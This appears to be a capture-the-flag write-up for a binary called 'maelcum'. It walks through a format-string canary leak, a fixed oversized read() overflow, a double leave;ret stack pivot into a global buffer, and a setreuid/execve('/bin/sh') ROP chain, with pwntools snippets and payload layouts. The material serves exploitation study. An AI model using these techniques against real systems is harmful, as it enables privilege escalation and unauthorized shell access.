# maelcum — exploit writeup

## Program structure (quick context)

`main` just wires things together: `init_routing()` zeroes a
`routing_table[8]` array and the global `relay_buf[512]`, `add_route()`
inserts two static routes, then `relay_status()`, `relay_data()` and
`print_routes()` run in sequence. The two interesting functions are
`relay_status` (format-string leak) and `relay_data` (the actual
memory-corruption bug).

### `relay_status` — format-string leak

```c
void relay_status(void) {
    char buf[72];                      // -0x50(%rbp), 72 bytes before canary

    printf("... asking?): ");
    fflush(stdout);

    ssize_t n = read(0, buf, 0x3f);     // bounded read, no overflow here
    if (n < 0) n = 0;
    buf[n] = 0;
    buf[strcspn(buf, "\n")] = 0;

    printf("relay tag: ");
    printf(buf);                        // <-- user input as format string
    fflush(stdout);
}
```

Same bug family as the earlier levels: `printf(buf)` instead of
`printf("%s", buf)`. The read itself is safely bounded, so this
function's only usefulness to the exploit is the leak. The script
sends `%17$p` and reads the canary straight back off the `relay tag:
` line:

```python
p.sendline(b'%17$p')
p.recvuntil(b'relay tag: ')
canary = int(p.recvline().strip(), 16)
```

### `relay_data` — the real bug: a fixed oversized `read()`

```c
void relay_data(void) {
    char buf[40];                       // -0x30(%rbp), 40 bytes before canary
    unsigned long len;

    printf("...");
    fflush(stdout);
    read(0, buf, 0x40);                 // <-- reads 64 bytes into a 40-byte buffer!

    if (strncmp(buf, "RELAY:", 6) == 0) {
        len = strtoul(buf + 6, NULL, 10);
        if (len <= 0x1ff) {
            printf("Transmitting %lu bytes\n", len);
            fflush(stdout);
            read(0, relay_buf, len);     // second read, into a GLOBAL buffer
            relay_len = len;
            printf("... %u ...\n", relay_len);
        }
    } else {
        puts("invalid relay command");
    }
}
```

This isn't an attacker-controlled-length overflow like the earlier
levels — the **first** `read()` call itself is miscompiled/miscoded
with a hardcoded length of `0x40` (64 bytes) into a 40-byte local
buffer (`rbp-0x30` up to the canary at `rbp-0x8` is only 40 bytes).
Every call to this function overflows by 24 bytes, which is just
enough, in one shot, to reach past the canary, the saved `rbp`, and
into the saved return address — no brute force or multiple calls
needed.

## Mitigations and how each is handled

| Mitigation | Status | How the exploit deals with it |
|---|---|---|
| Stack canary | **Found** | Leaked in `relay_status` via `%17$p`, then written back unchanged at its exact offset in `relay_data`'s overflow. |
| NX | Enabled | Payload is a ROP chain of libc calls, no injected shellcode. |
| PIE | Disabled | Both the binary's own gadget (`leave; ret` at a fixed address) and the libc offsets are used as hardcoded addresses. |
| SHSTK / IBT (CET) | Enabled | Only `pop reg; ret`-style gadgets and direct libc function calls are used — no indirect branches. |
| Partial RELRO | — | Not targeted. |
| Limited stack-overflow window | 64 bytes isn't enough to fit a full ROP chain | The exploit **pivots the stack into the global `relay_buf`** (512 bytes, plenty of room) instead of trying to cram the chain into the small stack overflow. |

## The stack pivot — how a 64-byte overflow delivers a full ROP chain

Because `relay_data`'s overflow only reaches 16 bytes past the return
address, there's no room there for `setreuid`/`execve` gadgets and
arguments directly. The exploit instead reuses the function's own
compiled epilogue as a **pivot gadget**:

```
4016ce: leave      ; mov rsp, rbp ; pop rbp
4016cf: ret
```

`first_stage` overwrites the three slots right after the (restored)
canary:

```
offset 0  : b"RELAY:<len>" padded to 40 bytes  -> satisfies strncmp, reaches the canary
offset 40 : leaked canary (8B)                 -> passes the canary check
offset 48 : relay_buf address (0x404200)       -> lands in the "saved rbp" slot
offset 56 : address of the leave;ret gadget    -> lands in the "return address" slot
```

When `relay_data` returns normally, its own epilogue runs:

1. **First `leave;ret`** (the function's real epilogue): `mov rsp,
   rbp` (rsp becomes the *old*, still-valid rbp), then `pop rbp` loads
   our injected value — `relay_buf`'s address — into `rbp`. `ret` then
   pops the next stack slot, which is our injected address of the
   *same* `leave;ret` gadget, and jumps there.
2. **Second `leave;ret`** (same gadget, executed again): this time
   `rbp` is `relay_buf`, so `mov rsp, rbp` **pivots the stack pointer
   into the global buffer**. `pop rbp` consumes the first 8 bytes
   sitting there — a throwaway `dummy = p64(8)` the script prepends —
   and `ret` pops the next 8 bytes, which is the first real gadget of
   the ROP chain, and jumps into it.

From that point on, execution proceeds entirely out of `relay_buf`,
which was filled by `relay_data`'s own *second* `read()` call — the
one gated by the `RELAY:<len>` command, which the exploit also
controls:

```python
exploit = p64(pop_rdi) + p64(1025)
exploit += p64(pop_rsi) + p64(1025) + p64(0)
exploit += p64(addr_setreuid)
exploit += p64(pop_rdi) + p64(addr_shell)
exploit += p64(pop_rsi) + p64(0) + p64(0)
exploit += p64(pop_rdx) + p64(0) * 5
exploit += p64(addr_execve)

len_rop = len(exploit) + 8          # +8 for the dummy rbp value
cmd = b'RELAY:' + str(len_rop).encode()
```

`len_rop` is reported in the `RELAY:` command precisely so the second
`read()` pulls in exactly `dummy + exploit` bytes (`second_stage`).

### The ROP chain itself

Identical pattern to the earlier levels, just executed out of
`relay_buf` instead of the stack:

1. **`setreuid(1025, 1025)`** — via `pop_rdi`/`pop_rsi` loading the
   arguments, then a direct call to `setreuid`'s libc address, so the
   eventual shell runs with the right privileges.
2. **`execve("/bin/sh", NULL, NULL)`** — `rdi` points at the
   `"/bin/sh"` string already present in libc, `rsi`/`rdx` are zeroed,
   then `execve`'s libc address is called directly. No `exit()`
   fallback is appended this time — once `execve` succeeds control
   never returns, and if it fails there's nothing left to clean up on
   a globally-pivoted stack anyway.

All libc addresses are fixed offsets from the known base
(`0x7ffff7c00000`), which, combined with no-PIE for the binary's own
`leave;ret` gadget, is what lets every address here be hardcoded
without a separate libc leak.

## Running it

```sh
python3 exploit.py
```

The script: leaks the canary through `relay_status`'s format-string
bug, sends the 64-byte `first_stage` to `relay_data` to overwrite the
canary (restored), the saved `rbp` (pointed at `relay_buf`) and the
return address (pointed at the binary's own `leave;ret`), then sends
`second_stage` — a dummy qword plus the `setreuid`/`execve` ROP chain
— as the payload `relay_data`'s second `read()` copies into
`relay_buf`. When `relay_data` returns, the double `leave;ret` pivots
the stack into `relay_buf` and the chain runs, dropping into an
interactive shell.

## Summary

| Stage | Technique |
|---|---|
| Vulnerability 1 | Format-string bug in `relay_status` (`printf(buf)` instead of `printf("%s", buf)`) |
| Vulnerability 2 | Hardcoded oversized `read(0, buf, 0x40)` into a 40-byte stack buffer in `relay_data` |
| Canary bypass | Leak canary with `%17$p`, reinsert it unchanged in the overflow payload |
| Limited overflow room | Stack-pivot via a double `leave; ret` into the global `relay_buf`, which the program's own protocol (`RELAY:<len>`) is abused to fill with the real ROP chain |
| NX bypass | ROP chain instead of shellcode |
| Privilege handling | `setreuid()` call before spawning shell |
| Shell spawn | `execve("/bin/sh", NULL, NULL)` using libc's own string |
| Address source | Hardcoded libc base + fixed (no-PIE) binary gadget address |
